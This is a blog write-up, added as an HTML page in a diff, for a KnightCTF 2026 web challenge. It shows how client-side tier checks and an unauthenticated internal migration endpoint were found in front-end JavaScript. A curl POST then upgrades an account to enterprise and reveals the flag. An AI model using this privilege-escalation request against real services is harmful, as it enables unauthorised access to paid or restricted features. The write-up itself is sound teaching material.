@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KnightCTF 2026 - Web 100 - KnightCloud | spiperac&#x27;s blog</title>
+    
+    
+    <link rel="stylesheet" href="https://spiperac.dev/style.css">
+    <link rel="stylesheet" href="https://spiperac.dev/character.css">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://spiperac.dev/favicon.ico">
+    <link rel="apple-touch-icon" href="https://spiperac.dev/favicon.ico" />
+    
+    
+</head>
+<body>
+    <nav id="top" class="navigation">
+    <ul class="nav-links">
+        <li><a href="https://spiperac.dev">Home</a></li>
+        <li><a href="https://spiperac.dev/tags/ctf">CTF</a></li>
+        <li><a href="https://spiperac.dev/pages/projects">Projects</a></li>
+        <li><a href="https://spiperac.dev/pages/about">About</a></li>
+    </ul>
+    <div class="nav-avatar">
+        <img src="https://spiperac.dev/images/avatar.png" alt="avatar" class="avatar">
+    </div>
+
+    <button id="theme-toggle" aria-label="Toggle theme">🌙</button>
+</nav>
+
+    
+    <div class="content">
+        <div id="content">
+            
+    <article>
+        <header>
+            <h1>KnightCTF 2026 - Web 100 - KnightCloud</h1>
+            <div class="blog-post-date">
+
+                Published: 2026-01-21
+                <span style="margin-left:2em;">
+                    <img src="https://spiperac.dev/images/read_time.svg" class="svg" alt="Clock" style="width:1em; height:1em; vertical-align:middle;">
+                    Read time: 2 min
+                </span>
+
+                
+            </div>
+        </header>
+        
+        
+            <div id="table-of-contents">
+                <h2>Table of Contents</h2>
+                <ul>
+                    
+                        <li>
+                            <a href="https://spiperac.dev/posts/knightctf-2026-web-100-knightcloud/#task">Task</a>
+                            
+                        </li>
+                    
+                        <li>
+                            <a href="https://spiperac.dev/posts/knightctf-2026-web-100-knightcloud/#enumeration">Enumeration</a>
+                            
+                        </li>
+                    
+                        <li>
+                            <a href="https://spiperac.dev/posts/knightctf-2026-web-100-knightcloud/#exploitation">Exploitation</a>
+                            
+                        </li>
+                    
+                        <li>
+                            <a href="https://spiperac.dev/posts/knightctf-2026-web-100-knightcloud/#flag">Flag</a>
+                            
+                        </li>
+                    
+                </ul>
+            </div>
+        
+        
+        <div class="blog-content">
+            <h2 id="task">Task</h2>
+<pre style="background-color:#212121;color:#eeffff;"><code><span>## KnightCloud
+</span><span>
+</span><span>### 100 Points
+</span><span>
+</span><span>Author
+</span><span>
+</span><span>TareqAhamed
+</span><span>
+</span><span>Your startup just signed up for KnightCloud&#39;s enterprise SaaS platform, but the premium features are locked behind a paywall. 
+</span><span>As a security researcher, you&#39;ve been tasked to test their platform&#39;s security.
+</span><span>Can you find a way to access the premium analytics dashboard without paying?
+</span><span>
+</span><span>&gt; [http://23.239.26.112:8091/](http://23.239.26.112:8091/)
+</span><span>
+</span><span>**Flag Format: KCTF{fl4g_HeR3}**
+</span></code></pre>
+<h2 id="enumeration">Enumeration</h2>
+<p>Inspecting the index page source shows us <strong>a couple of</strong> JS files being loaded.</p>
+<pre data-lang="html" style="background-color:#212121;color:#eeffff;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#89ddff;">&lt;!</span><span style="color:#c792ea;">DOCTYPE </span><span style="color:#f78c6c;">html</span><span style="color:#89ddff;">&gt; &lt;</span><span style="color:#f07178;">html </span><span style="font-style:italic;color:#ffcb6b;">lang</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">en</span><span style="color:#89ddff;">&quot;&gt; &lt;</span><span style="color:#f07178;">head</span><span style="color:#89ddff;">&gt; &lt;</span><span style="color:#f07178;">meta </span><span style="font-style:italic;color:#ffcb6b;">charset</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">UTF-8</span><span style="color:#89ddff;">&quot; /&gt; &lt;</span><span style="color:#f07178;">meta </span><span style="font-style:italic;color:#ffcb6b;">name</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">viewport</span><span style="color:#89ddff;">&quot; </span><span style="font-style:italic;color:#ffcb6b;">content</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">width=device-width, initial-scale=1.0</span><span style="color:#89ddff;">&quot; /&gt; &lt;</span><span style="color:#f07178;">title</span><span style="color:#89ddff;">&gt;</span><span>KnightCloud - Enterprise Cloud Platform</span><span style="color:#89ddff;">&lt;/</span><span style="color:#f07178;">title</span><span style="color:#89ddff;">&gt; &lt;</span><span style="color:#f07178;">link </span><span style="font-style:italic;color:#ffcb6b;">rel</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">preconnect</span><span style="color:#89ddff;">&quot; </span><span style="font-style:italic;color:#ffcb6b;">href</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">[https://fonts.googleapis.com](view-source:https://fonts.googleapis.com/)</span><span style="color:#89ddff;">&quot;&gt; &lt;</span><span style="color:#f07178;">link </span><span style="font-style:italic;color:#ffcb6b;">rel</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">preconnect</span><span style="color:#89ddff;">&quot; </span><span style="font-style:italic;color:#ffcb6b;">href</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">[https://fonts.gstatic.com](view-source:https://fonts.gstatic.com/)</span><span style="color:#89ddff;">&quot; </span><span style="font-style:italic;color:#ffcb6b;">crossorigin</span><span style="color:#89ddff;">&gt; &lt;</span><span style="color:#f07178;">link </span><span style="font-style:italic;color:#ffcb6b;">href</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">[https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap](view-source:https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap)</span><span style="color:#89ddff;">&quot; </span><span style="font-style:italic;color:#ffcb6b;">rel</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">stylesheet</span><span style="color:#89ddff;">&quot;&gt; &lt;</span><span style="color:#f07178;">script </span><span style="font-style:italic;color:#ffcb6b;">type</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">module</span><span style="color:#89ddff;">&quot; </span><span style="font-style:italic;color:#ffcb6b;">crossorigin src</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">[/assets/index-DH6mLR_s.js](view-source:http://23.239.26.112:8091/assets/index-DH6mLR_s.js)</span><span style="color:#89ddff;">&quot;&gt;&lt;/</span><span style="color:#f07178;">script</span><span style="color:#89ddff;">&gt; &lt;</span><span style="color:#f07178;">link </span><span style="font-style:italic;color:#ffcb6b;">rel</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">modulepreload</span><span style="color:#89ddff;">&quot; </span><span style="font-style:italic;color:#ffcb6b;">crossorigin href</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">[/assets/vendor-JYw6Q_0K.js](view-source:http://23.239.26.112:8091/assets/vendor-JYw6Q_0K.js)</span><span style="color:#89ddff;">&quot;&gt; &lt;</span><span style="color:#f07178;">link </span><span style="font-style:italic;color:#ffcb6b;">rel</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">modulepreload</span><span style="color:#89ddff;">&quot; </span><span style="font-style:italic;color:#ffcb6b;">crossorigin href</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">[/assets/utils-VSpmzgsF.js](view-source:http://23.239.26.112:8091/assets/utils-VSpmzgsF.js)</span><span style="color:#89ddff;">&quot;&gt; &lt;</span><span style="color:#f07178;">link </span><span style="font-style:italic;color:#ffcb6b;">rel</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">stylesheet</span><span style="color:#89ddff;">&quot; </span><span style="font-style:italic;color:#ffcb6b;">crossorigin href</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">[/assets/index-DFH9T6sH.css](view-source:http://23.239.26.112:8091/assets/index-DFH9T6sH.css)</span><span style="color:#89ddff;">&quot;&gt; &lt;/</span><span style="color:#f07178;">head</span><span style="color:#89ddff;">&gt; &lt;</span><span style="color:#f07178;">body</span><span style="color:#89ddff;">&gt; &lt;</span><span style="color:#f07178;">div </span><span style="font-style:italic;color:#ffcb6b;">id</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">root</span><span style="color:#89ddff;">&quot;&gt;&lt;/</span><span style="color:#f07178;">div</span><span style="color:#89ddff;">&gt; &lt;/</span><span style="color:#f07178;">body</span><span style="color:#89ddff;">&gt; &lt;/</span><span style="color:#f07178;">html</span><span style="color:#89ddff;">&gt;
+</span></code></pre>
+<p>Let’s take a look at the non-vendor one:</p>
+<pre data-lang="html" style="background-color:#212121;color:#eeffff;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#89ddff;">&lt;</span><span style="color:#f07178;">script </span><span style="font-style:italic;color:#ffcb6b;">type</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">module</span><span style="color:#89ddff;">&quot; </span><span style="font-style:italic;color:#ffcb6b;">crossorigin src</span><span style="color:#89ddff;">=&quot;</span><span style="color:#c3e88d;">[/assets/index-DH6mLR_s.js](view-source:http://23.239.26.112:8091/assets/index-DH6mLR_s.js)</span><span style="color:#89ddff;">&quot;&gt;&lt;/</span><span style="color:#f07178;">script</span><span style="color:#89ddff;">&gt;
+</span></code></pre>
+<p>Its minified/uglified so I've used https://beautifier.io/ to "beautify" it back into a more readable form.
+This gives us around ~900k of JavaScript code, which I won’t paste in full, just the interesting parts.</p>
+<p>This one, for example, handles the user <strong>session</strong>:</p>
+<pre data-lang="js" style="background-color:#212121;color:#eeffff;" class="language-js "><code class="language-js" data-lang="js"><span>localStorage</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">setItem</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">session_data</span><span style="color:#89ddff;">&quot;,
+</span><span>  </span><span style="color:#82aaff;">btoa</span><span>(</span><span style="color:#f78c6c;">JSON</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">stringify</span><span>(</span><span style="color:#89ddff;">{
+</span><span>    sub</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">any</span><span style="color:#89ddff;">&quot;,
+</span><span>    email</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">x@x.com</span><span style="color:#89ddff;">&quot;,
+</span><span>    subscription</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">enterprise</span><span style="color:#89ddff;">&quot;,
+</span><span>    role</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">admin</span><span style="color:#89ddff;">&quot;,
+</span><span>    iat</span><span style="color:#89ddff;">: </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">,
+</span><span>    exp</span><span style="color:#89ddff;">: </span><span style="color:#f78c6c;">9999999999
+</span><span>  </span><span style="color:#89ddff;">}</span><span>))
+</span><span>)
+</span></code></pre>
+<p>Also, there are a couple of <strong>internal admin endpoints</strong> exposed:</p>
+<pre style="background-color:#212121;color:#eeffff;"><code><span>/api/internal/v1/migrate/user-tier
+</span><span>/api/internal/v1/migrate/user-data
+</span><span>/api/internal/v2/migrate/billing
+</span></code></pre>
+<p>Checking for user tier is completely handled on the front-end:</p>
+<pre data-lang="js" style="background-color:#212121;color:#eeffff;" class="language-js "><code class="language-js" data-lang="js"><span style="font-style:italic;color:#c792ea;">const </span><span>c </span><span style="color:#89ddff;">= </span><span>r</span><span style="color:#89ddff;">.</span><span>subscriptionTier </span><span style="color:#89ddff;">=== &quot;</span><span style="color:#c3e88d;">premium</span><span style="color:#89ddff;">&quot;
+</span></code></pre>
+<p>Later on, we can see there is a reference to the flag in the code, in the part that handles analytics data:</p>
+<pre data-lang="js" style="background-color:#212121;color:#eeffff;" class="language-js "><code class="language-js" data-lang="js"><span>                        })</span><span style="color:#89ddff;">, </span><span>a </span><span style="color:#89ddff;">&amp;&amp; </span><span>f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsxs</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">div</span><span style="color:#89ddff;">&quot;, {
+</span><span>                            className</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">analytics-data</span><span style="color:#89ddff;">&quot;,
+</span><span>                            children</span><span style="color:#89ddff;">: </span><span>[f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsxs</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">div</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                className</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">analytics-item</span><span style="color:#89ddff;">&quot;,
+</span><span>                                children</span><span style="color:#89ddff;">: </span><span>[f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsx</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">span</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                    children</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">Total Requests</span><span style="color:#89ddff;">&quot;
+</span><span>                                </span><span style="color:#89ddff;">}</span><span>)</span><span style="color:#89ddff;">, </span><span>f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsx</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">strong</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                    children</span><span style="color:#89ddff;">: </span><span>a</span><span style="color:#89ddff;">.</span><span>totalRequests
+</span><span>                                </span><span style="color:#89ddff;">}</span><span>)]
+</span><span>                            </span><span style="color:#89ddff;">}</span><span>)</span><span style="color:#89ddff;">, </span><span>f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsxs</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">div</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                className</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">analytics-item</span><span style="color:#89ddff;">&quot;,
+</span><span>                                children</span><span style="color:#89ddff;">: </span><span>[f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsx</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">span</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                    children</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">Active Users</span><span style="color:#89ddff;">&quot;
+</span><span>                                </span><span style="color:#89ddff;">}</span><span>)</span><span style="color:#89ddff;">, </span><span>f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsx</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">strong</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                    children</span><span style="color:#89ddff;">: </span><span>a</span><span style="color:#89ddff;">.</span><span>activeUsers
+</span><span>                                </span><span style="color:#89ddff;">}</span><span>)]
+</span><span>                            </span><span style="color:#89ddff;">}</span><span>)</span><span style="color:#89ddff;">, </span><span>f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsxs</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">div</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                className</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">analytics-item</span><span style="color:#89ddff;">&quot;,
+</span><span>                                children</span><span style="color:#89ddff;">: </span><span>[f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsx</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">span</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                    children</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">Conversion Rate</span><span style="color:#89ddff;">&quot;
+</span><span>                                </span><span style="color:#89ddff;">}</span><span>)</span><span style="color:#89ddff;">, </span><span>f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsxs</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">strong</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                    children</span><span style="color:#89ddff;">: </span><span>[a</span><span style="color:#89ddff;">.</span><span>conversionRate</span><span style="color:#89ddff;">, &quot;</span><span style="color:#c3e88d;">%</span><span style="color:#89ddff;">&quot;</span><span>]
+</span><span>                                </span><span style="color:#89ddff;">}</span><span>)]
+</span><span>                            </span><span style="color:#89ddff;">}</span><span>)</span><span style="color:#89ddff;">, </span><span>f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsxs</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">div</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                className</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">analytics-item</span><span style="color:#89ddff;">&quot;,
+</span><span>                                children</span><span style="color:#89ddff;">: </span><span>[f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsx</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">span</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                    children</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">Revenue</span><span style="color:#89ddff;">&quot;
+</span><span>                                </span><span style="color:#89ddff;">}</span><span>)</span><span style="color:#89ddff;">, </span><span>f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsxs</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">strong</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                    children</span><span style="color:#89ddff;">: </span><span>[</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">$</span><span style="color:#89ddff;">&quot;, </span><span>a</span><span style="color:#89ddff;">.</span><span>revenue]
+</span><span>                                </span><span style="color:#89ddff;">}</span><span>)]
+</span><span>                            </span><span style="color:#89ddff;">}</span><span>)</span><span style="color:#89ddff;">, </span><span>f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsxs</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">div</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                className</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">analytics-item</span><span style="color:#89ddff;">&quot;,
+</span><span>                                children</span><span style="color:#89ddff;">: </span><span>[f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsx</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">span</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                    children</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">Growth</span><span style="color:#89ddff;">&quot;
+</span><span>                                </span><span style="color:#89ddff;">}</span><span>)</span><span style="color:#89ddff;">, </span><span>f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsxs</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">strong</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                    children</span><span style="color:#89ddff;">: </span><span>[a</span><span style="color:#89ddff;">.</span><span>growth</span><span style="color:#89ddff;">, &quot;</span><span style="color:#c3e88d;">%</span><span style="color:#89ddff;">&quot;</span><span>]
+</span><span>                                </span><span style="color:#89ddff;">}</span><span>)]
+</span><span>                            </span><span style="color:#89ddff;">}</span><span>)</span><span style="color:#89ddff;">, </span><span>a</span><span style="color:#89ddff;">.</span><span>flag </span><span style="color:#89ddff;">&amp;&amp; </span><span>f</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">jsxs</span><span>(</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">div</span><span style="color:#89ddff;">&quot;, {
+</span><span>                                className</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">flag-display</span><span style="color:#89ddff;">&quot;,
+</span><span>                                children</span><span style="color:#89ddff;">: </span><span>[</span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">ðŸŽ‰ Congratulations! </span><span style="color:#89ddff;">&quot;, </span><span>a</span><span style="color:#89ddff;">.</span><span>flag]
+</span></code></pre>
+<p>Which is behind <code>"Premium Feature"</code>, requiring us to upgrade our account to enterprise.</p>
+<p>There is also an <strong>upgradeUser</strong> function with a completely exposed and <strong>unauthenticated</strong> endpoint:</p>
+<pre data-lang="js" style="background-color:#212121;color:#eeffff;" class="language-js "><code class="language-js" data-lang="js"><span>        updateUserTier</span><span style="color:#89ddff;">: </span><span style="color:#c792ea;">async </span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">e</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">r</span><span style="color:#89ddff;">) </span><span style="font-style:italic;color:#c792ea;">=&gt; </span><span style="color:#89ddff;">{
+</span><span>            </span><span style="font-style:italic;color:#c792ea;">try </span><span style="color:#89ddff;">{
+</span><span>                </span><span style="font-style:italic;color:#c792ea;">return </span><span>(</span><span style="font-style:italic;color:#c792ea;">await </span><span>c</span><span style="color:#89ddff;">.</span><span style="color:#82aaff;">post</span><span>(</span><span style="color:#89ddff;">`${</span><span>S</span><span style="color:#89ddff;">}${</span><span>N</span><span style="color:#89ddff;">.</span><span>migrationEndpoints</span><span style="color:#89ddff;">.</span><span>userTier</span><span style="color:#89ddff;">}`, {
+</span><span>                    u</span><span style="color:#89ddff;">: </span><span>e</span><span style="color:#89ddff;">,
+</span><span>                    t</span><span style="color:#89ddff;">: </span><span>r
+</span><span>                </span><span style="color:#89ddff;">}</span><span>))</span><span style="color:#89ddff;">.</span><span>data
+</span><span>            </span><span style="color:#89ddff;">} </span><span style="font-style:italic;color:#c792ea;">catch </span><span>(t) </span><span style="color:#89ddff;">{
+</span><span>                </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#f78c6c;">null
+</span><span>            </span><span style="color:#89ddff;">}
+</span><span>        </span><span style="color:#89ddff;">},
+</span><span>        syncUserData</span><span style="color:#89ddff;">: </span><span style="color:#c792ea;">async </span><span style="color:#f78c6c;">e </span><span style="font-style:italic;color:#c792ea;">=&gt; </span><span style="color:#f78c6c;">null</span><span style="color:#89ddff;">,
+</span><span>        migrateBilling</span><span style="color:#89ddff;">: </span><span style="color:#c792ea;">async </span><span style="color:#f78c6c;">e </span><span style="font-style:italic;color:#c792ea;">=&gt; </span><span style="color:#f78c6c;">null
+</span><span>    }</span><span style="color:#89ddff;">;
+</span></code></pre>
+<p>With migration endpoints defined as:</p>
+<pre data-lang="js" style="background-color:#212121;color:#eeffff;" class="language-js "><code class="language-js" data-lang="js"><span>        migrationEndpoints</span><span style="color:#89ddff;">: {
+</span><span>            userTier</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">/internal/v1/migrate/user-tier</span><span style="color:#89ddff;">&quot;,
+</span><span>            userData</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">/internal/v1/migrate/user-data</span><span style="color:#89ddff;">&quot;,
+</span><span>            billing</span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">/internal/v2/migrate/billing</span><span style="color:#89ddff;">&quot;
+</span><span>        </span><span style="color:#89ddff;">},
+</span></code></pre>
+<h2 id="exploitation">Exploitation</h2>
+<p>Since <code>updateUserTier</code> is exposed, we can get our user UID from local storage and attempt to upgrade our tier (<code>t</code> parameter) to <code>enterprise</code>.</p>
+<p><img src="/images/ace2134859f2f3894bd76190381e7885.png" alt="" /></p>
+<pre data-lang="shell-session" style="background-color:#212121;color:#eeffff;" class="language-shell-session "><code class="language-shell-session" data-lang="shell-session"><span>~/Vault/isec/ctf/knight2k26/web100-ap  ✓ $ curl -X POST http://23.239.26.112:8091/api/internal/v1/migrate/user-tier -H &quot;Content-Type: application/json&quot; -d &#39;{&quot;u&quot;:&quot;fa4eab86-a141-48ca-8133-6a97b76693ea&quot;,&quot;t&quot;:&quot;enterprise&quot;}&#39;
+</span><span>
+</span><span>{&quot;success&quot;:true,&quot;uid&quot;:&quot;fa4eab86-a141-48ca-8133-6a97b76693ea&quot;,&quot;tier&quot;:&quot;enterprise&quot;}%
+</span><span>
+</span></code></pre>
+<p>It succeeded, and if we go back to the dashboard and click <strong>Load Analytics</strong> under <strong>Advanced Analytics</strong>, the flag is displayed:</p>
+<p><img src="/images/676e3ce719d29927c5f840437baabcf3.png" alt="" /></p>
+<h2 id="flag">Flag</h2>
+<p>Flag is: <strong>KCTF{Pr1v1l3g3_3sc4l4t10n_1s_fun}</strong></p>
+<p><img src="/images/ce660dab554be7ac37a981c7a13782e9.png" alt="" /></p>
+
+        </div>
+    </article>
+
+        </div>
+    </div>
+    
+    <a href="#top" class="top-btn">⏫</a>
+<footer>
+    <a href="https://mastodon.social/@spiperac" target="_blank" rel="noopener noreferrer">
+        <img src="/icons/mastodon.svg" alt="Mastodon" id="svg" />
+    </a>
+
+    <a href="https://github.com/spiperac" target="_blank" rel="noopener noreferrer">
+        <img src="/icons/github.svg" alt="GitHub" id="svg" />
+    </a>
+
+    <a href="mailto:sp@spiperac.dev">
+        <img src="/icons/email.svg" alt="Email" id="svg" />
+    </a>
+
+    <p>© 2026 spiperac</p>
+</footer>
+
+
+<script>
+  const toggle = document.getElementById('theme-toggle');
+  const root = document.documentElement;
+
+  // Load saved theme or default to dark
+  const savedTheme = localStorage.getItem('theme') || 'dark';
+  root.setAttribute('data-theme', savedTheme);
+  toggle.textContent = savedTheme === 'light' ? '🌙' : '☀️';
+
+  toggle.addEventListener('click', () => {
+      const current = root.getAttribute('data-theme');
+      const next = current === 'light' ? 'dark' : 'light';
+      root.setAttribute('data-theme', next);
+      toggle.textContent = next === 'light' ? '🌙' : '☀️';
+      localStorage.setItem('theme', next);
+  });
+</script>
+</body>
+</html>
